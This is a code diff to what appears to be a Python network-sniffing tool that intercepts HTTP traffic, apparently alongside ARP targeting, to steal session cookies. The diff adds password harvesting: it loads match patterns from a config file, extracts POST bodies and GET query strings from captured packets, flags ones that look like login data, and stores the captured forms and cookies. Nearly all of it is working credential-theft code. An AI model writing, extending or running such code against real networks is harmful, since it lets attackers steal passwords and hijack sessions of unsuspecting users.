@@ -13,7 +13,7 @@ from PyQt4.QtNetwork import *
 import thread
 from multiprocessing import Queue, Pipe, Process
 import getopt
-
+import MonsterLogger
 class MonsterCore(QThread):
 	"""docstring for MonsterCore"""
 	filename = False
@@ -23,7 +23,7 @@ class MonsterCore(QThread):
 	attacked = set()
 	cookies = []
 	parent_conn = None
-	
+	patterns = []
 	def __init__(self, filename, interface, arp_target):
 		super(MonsterCore, self).__init__()
 		self.filename = filename
@@ -31,11 +31,18 @@ class MonsterCore(QThread):
 		self.arp_target = arp_target
 		self.my_ip = str(IP(dst="8.8.8.8").src)
 		if filename:
-			print " [info] reading packets in " +filename
+			MonsterLogger.logger.info("reading packets in " +filename)
 		if interface:
-			print " [info] IP address on "+interface+" is set to "+self.my_ip
-			print " [info] Listening for HTTP traffic on "+interface
-		
+			MonsterLogger.logger.info("IP address on "+interface+" is set to "+self.my_ip)
+			MonsterLogger.logger.info("Listening for HTTP traffic on "+interface)
+		f = open("pattern.cfg", "r")
+		for line in f.readlines():
+			pt = []
+			for item in line.split(" "):
+				item = item.strip()
+				pt.append(item)
+			self.patterns.append(pt)
+
 	
 	def extractheader(self, data, header):
 	
@@ -47,6 +54,21 @@ class MonsterCore(QThread):
 				return line[len(header+": "):]
 		return ""
 
+	def extractPwd(self, juicyInfo):
+		MonsterLogger.logger.error("juicyInfo: " + juicyInfo)
+		for pattern in self.patterns:
+			matched = True
+			MonsterLogger.logger.error("pattenr:" + str(pattern))
+			for item in pattern:
+				if juicyInfo.find(item) == -1:
+					matched = False
+					break
+			if matched:
+				MonsterLogger.logger.critical("find pwd info!")
+				MonsterLogger.logger.critical("matched mattern: " + str(pattern))
+				MonsterLogger.printJuicyForm(juicyInfo)
+				return True
+
 	def ontothosepackets(self, pkt):
 		if not IP in pkt:
 			return
@@ -55,13 +77,32 @@ class MonsterCore(QThread):
 			return
 
 		data = str(pkt['TCP'].payload)
-		
-		if (len(data.split("Cookie"))<1): return
+		url = "/"
+		try:
+			if data.startswith("POST"):
+				MonsterLogger.logger.error("post pkt!")
+				juicyInfo = data[data.find("\r\n\r\n") + 4:]
+				uri = data[4:data.find("\r\n")][:data.find("HTTP")].strip()
+			elif data.startswith("GET"):
+				juicyInfo = data[3:data.find("\r\n")][:data.find("HTTP")].strip()
+				uri = juicyInfo
+			else:
+				return
+		except IndexError, e:
+			#invalid pkt
+			return
 
 		host = self.extractheader(data, "Host")
-		cookie = self.extractheader(data, "Cookie")
 		source = str(pkt['IP'].src)
-		useragent = self.extractheader(data,"User-Agent")		
+		useragent = self.extractheader(data,"User-Agent")
+
+		if self.extractPwd(juicyInfo):
+			MonsterLogger.storeForm(useragent, host, uri, juicyInfo)
+		if (len(data.split("Cookie"))<1): return
+		cookie = self.extractheader(data, "Cookie")
+
+		MonsterLogger.storeCookie(useragent, host, uri, cookie)
+				
 		if Ether in pkt:
 			ssid = "Ether"
 		else:
@@ -72,7 +113,7 @@ class MonsterCore(QThread):
 			else:
 				ssid = "Unknown"
 		if host and cookie and self.my_ip != None:
-			print "Cookie found"
+			MonsterLogger.logger.critical("cookie found!")
 			self.emit(SIGNAL("cookieFound"),(ssid,source,host),cookie,useragent)
 			#self.model.addCookie(("ASUS",source,host), cookie)
 			#self.attack(source, host, cookie, useragent)
@@ -98,10 +139,7 @@ class MonsterCore(QThread):
 	
 	
 	def handlepkt(self, pkt):
-		self.ontothosepackets(pkt)
-		'''@todo: handle internal links, see 
-		http://stackoverflow.com/questions/6951199/qwebview-doesnt-open-links-in-new-window-and-not-start-external-application-for 
-		by flankerhqd017@gmailc.om''' 
+		self.ontothosepackets(pkt) 
 	
 	def sniff(self):
 		'''@todo: maybe we can let user specify more ports to listen on '''
